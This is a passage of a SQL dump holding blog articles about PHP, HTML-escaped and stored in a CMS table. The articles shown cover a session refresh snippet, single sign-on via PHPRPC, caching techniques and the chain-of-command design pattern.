style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:#dd0000;background-color:inherit;&quot;&gt;$allowT&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;]&amp;gt;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:#dd0000;background-color:inherit;&quot;&gt;$allowTime&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;){&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px !important;margin-right:0px !important;margin-bottom:0px !important;margin-left:0px !important;padding-top:0px !important;padding-right:3px !important;padding-bottom:0px !important;padding-left:10px !important;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:solid;border-width:initial;border-color:initial;list-style-type:decimal-leading-zero;list-style-image:initial;list-style-position:outside !important;border-left-width:3px;border-left-color:#6ce26c;background-color:#ffffff;color:inherit;line-height:14px;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:#dd0000;background-color:inherit;&quot;&gt;$refresh&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;&amp;nbsp;=&amp;nbsp;true;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px !important;margin-right:0px !important;margin-bottom:0px !important;margin-left:0px !important;padding-top:0px !important;padding-right:3px !important;padding-bottom:0px !important;padding-left:10px !important;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:solid;border-width:initial;border-color:initial;list-style-type:decimal-leading-zero;list-style-image:initial;list-style-position:outside !important;border-left-width:3px;border-left-color:#6ce26c;background-color:#f8f8f8;color:#5c5c5c;line-height:14px;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:#dd0000;background-color:inherit;&quot;&gt;$_SESSION&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:#dd0000;background-color:inherit;&quot;&gt;$allowT&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;]&amp;nbsp;=&amp;nbsp;time();&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px !important;margin-right:0px !important;margin-bottom:0px !important;margin-left:0px !important;padding-top:0px !important;padding-right:3px !important;padding-bottom:0px !important;padding-left:10px !important;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:solid;border-width:initial;border-color:initial;list-style-type:decimal-leading-zero;list-style-image:initial;list-style-position:outside !important;border-left-width:3px;border-left-color:#6ce26c;background-color:#ffffff;color:inherit;line-height:14px;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;}&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:blue;background-color:inherit;font-weight:bold;&quot;&gt;else&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;{&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px !important;margin-right:0px !important;margin-bottom:0px !important;margin-left:0px !important;padding-top:0px !important;padding-right:3px !important;padding-bottom:0px !important;padding-left:10px !important;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:solid;border-width:initial;border-color:initial;list-style-type:decimal-leading-zero;list-style-image:initial;list-style-position:outside !important;border-left-width:3px;border-left-color:#6ce26c;background-color:#f8f8f8;color:#5c5c5c;line-height:14px;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:#dd0000;background-color:inherit;&quot;&gt;$refresh&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;&amp;nbsp;=&amp;nbsp;false;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px !important;margin-right:0px !important;margin-bottom:0px !important;margin-left:0px !important;padding-top:0px !important;padding-right:3px !important;padding-bottom:0px !important;padding-left:10px !important;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:solid;border-width:initial;border-color:initial;list-style-type:decimal-leading-zero;list-style-image:initial;list-style-position:outside !important;border-left-width:3px;border-left-color:#6ce26c;background-color:#ffffff;color:inherit;line-height:14px;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;}&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px !important;margin-right:0px !important;margin-bottom:0px !important;margin-left:0px !important;padding-top:0px !important;padding-right:3px !important;padding-bottom:0px !important;padding-left:10px !important;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:solid;border-width:initial;border-color:initial;list-style-type:decimal-leading-zero;list-style-image:initial;list-style-position:outside !important;border-left-width:3px;border-left-color:#6ce26c;background-color:#f8f8f8;color:#5c5c5c;line-height:14px;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;?&amp;gt; &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/span&gt;', 1, 1, 0, 0, 1302791552, 1, 'admin'),
(60, 1, '基于PHPRPC的单点登录（SSO）的实现', '', '', '&lt;span class=&quot;Apple-style-span&quot; style=&quot;color:#634463;font-family:arial, ''lucida grande'', verdana, tahoma, sans-serif;line-height:22px;&quot;&gt;&lt;p style=&quot;margin-top:15px;margin-right:0px;margin-bottom:15px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;PHPRPC是什么：&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\nPHPRPC 是一个轻型的、安全的、跨网际的、跨语言的、跨平台的、跨环境的、跨域的、支持复杂对象传输的、支持引用参数传递的、支持内容输出重定向的、支持分级错误处理的、支持会话的、面向服务的高性能远程过程调用协议。&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:15px;margin-right:0px;margin-bottom:15px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;因为PHPRPC有以上诸多特性，那么我们的SSO也可以实现安全、快捷、跨域。&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:15px;margin-right:0px;margin-bottom:15px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;所以单点登录，就是用户只需要在中心认证服务器登录一次，然后浏览器通过中心认证服务器返回的信息轮询访问应用系统进行模拟登录，之后用户再访问应用系统的时候不需要登录就能访问了。&lt;br /&gt;\r\n其实现原理就是浏览器（用phprpc for javascript）请求中心认证服务器(phprpc for php)，通常此时的浏览器就是一个登录页面，浏览器将用户名和密码传递给中心认证服务器，中心认证服务器验证成功之后，查找数据库里此用户名和密码对应的信息，根据这些信息生成一个令牌(token)返回给浏览器，浏览器在用token访问应用系统，应用系统收到token之后，再用收到的token访问中心认证服务器，中心认证服务器通过这个token查找数据库，从而能够找到对应应用系统的用户名和密码，然后将这个用户名和密码返回给应用系统，应用系统再收到的用户名和密码进行登录（通常就是一次写SESSION或者COOKIE的过程）&lt;br /&gt;\r\n就像设计图中所展示的，统一认证服务器收到浏览器通过javascript传递过来的用户名和密码检索“认证服务器用户表”，从而得到“用户ID”，根据“用户ID”再去检索“应用系统用户表”，然后就会得到一条或多条记录，把每一个结果都在“临时会话表”中生成一条记录，这里的“会话ID”是表的主键，也就是我们的token，而第二个字段id是对应的“应用系统用户表”的主键，还有一点比较重要，就是根据“应用系统ID”检索“应用系统表”，从而获得应用系统的地址。&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n然后统一认证服务器将token与应用系统的访问地址组成一个新的数组返回给浏览器&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n然后浏览器再运行JS将传回来的token作为参数访问应用系统服务端。&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n应用系统使用token访问统一认证服务器从而获取用户名和密码，获得用户名密码之后就完成了登录。&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n请看代码能更了解。&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n了解更多请访问http://www.phprpc.org&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n借助一下数据库设计图，应该更好理解&lt;/p&gt;\r\n&lt;/span&gt;', 1, 1, 0, 0, 1302791706, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(61, 1, 'PHP常见缓存技术分析', '', '', '&lt;span class=&quot;Apple-style-span&quot; style=&quot;color:#634463;font-family:arial, ''lucida grande'', verdana, tahoma, sans-serif;line-height:22px;&quot;&gt;在大部份情况下我们的网站都会使用数据库作为站点数据存储的容器。当你执行一个SQL查询时，典型的处理过程是：连接数据库-&amp;gt;准备SQL查询-&amp;gt;发送查询到数据库-&amp;gt;取得数据库返回结果-&amp;gt;关闭数据库连接。但数据库中有些数据是完全静态的或不太经常变动的，缓存系统会通过把SQL查询的结果缓存到一个更快的存储系统中存储，从而避免频繁操作数据库而很大程度上提高了程序执行时间，而且缓存查询结果也允许你后期处理。&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n&lt;strong style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;普遍使用的缓存技术&lt;/strong&gt;&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n数据缓存：这里所说的数据缓存是指数据库查询缓存，每次访问页面的时候,都会先检测相应的缓存数据是否存在，如果不存在，就连接数据库，得到数据，并把查询结果序列化后保存到文件&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n中，以后同样的查询结果就直接从缓存文件中获得。&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n&lt;strong style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;页面缓存：&lt;/strong&gt;&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n每次访问页面的时候，都会先检测相应的缓存页面文件是否存在，如果不存在，就连接数据库，得到数据，显示页面并同时生成缓存页面文件，这样下次访问的时候页面文件就发挥作用了。(模板引擎和网上常见的一些缓存类通常有此功能)&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n&lt;strong style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;内存缓存:&lt;/strong&gt;&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n在里就不介绍了，不是本文所要讨论的，只简单提一下：&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\nMemcached是高性能的，分布式的内存对象缓存系统，用于在动态应用中减少数据库负载，提升访问速度。&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\ndbcached 是一款基于 Memcached 和 NMDB 的分布式 key-value 数据库内存缓存系统。&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n以上的缓存技术虽然能很好的解决频繁查询数据库的问题，但其缺点在在于数据无时效性，下面我给出我在项目中常用的方法：&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n&lt;strong style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;时间触发缓存：&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n&lt;/strong&gt;检查文件是否存在并且时间戳小于设置的过期时间,如果文件修改的时间戳比当前时间戳减去过期时间戳大，那么就用缓存，否则更新缓存。&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n设定时间内不去判断数据是否要更新，过了设定时间再更新缓存。以上只适合对时效性要求不高的情况下使用 ，否则请看下面。&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n&lt;strong style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;内容触发缓存：&lt;/strong&gt;&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n当插入数据或更新数据时，强制更新缓存。&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n在这里我们可以看到，当有大量数据频繁需要更新时，最后都要涉及磁盘读写操作。怎么解决呢？我在日常项目中，通常并不缓存所有内容，而是缓存一部分不经常变的内容来解决。但在大负荷的情况下，最好要用共享内存做缓存系统。&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n到这里PHP缓存也许有点解决方案了，但其缺点是，因为每次请求仍然要经过PHP解析，在大负荷的情况下效率问题还是比效严重，在这种情况下，也许会用到静态缓存。&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n&lt;strong style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;静态缓存&lt;/strong&gt;&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n这里所说的静态缓存是指HTML缓存，HTML缓存一般是无需判断数据是否要更新的，因为通常在使用HTML的场合一般是不经常变动内容的页面。数据更新的时候把HTML也强制更新一下就可以了。&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n其实一个缓存系统涉及的问题是比较多的，我在这里只介绍一下我平时的缓存思路，并没有介绍利用软件来实现缓存和写出具体代码。&amp;nbsp;&lt;br style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot; /&gt;\r\n如果您有什么好的解决方案也请在下面提出，让我们一起互相探讨。&lt;/span&gt;', 1, 1, 0, 0, 1302791916, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(62, 1, 'PHP设计模式——命令链模式', '', '', '&lt;span class=&quot;Apple-style-span&quot; style=&quot;color:#634463;font-family:''courier new'', monospace;line-height:normal;&quot;&gt;&lt;ol class=&quot;dp-c&quot; style=&quot;margin-top:0px;margin-right:1px;margin-bottom:0px;margin-left:45px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:0px;list-style-type:decimal-leading-zero;list-style-position:initial;list-style-image:initial;color:#5c5c5c;border-left-width:1px;border-left-style:solid;border-left-color:#dddddd;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;lt;?php &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;interface&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;ICommand{&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:green;&quot;&gt;//&amp;nbsp;命令处理接口&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;function&lt;/span&gt;&lt;span 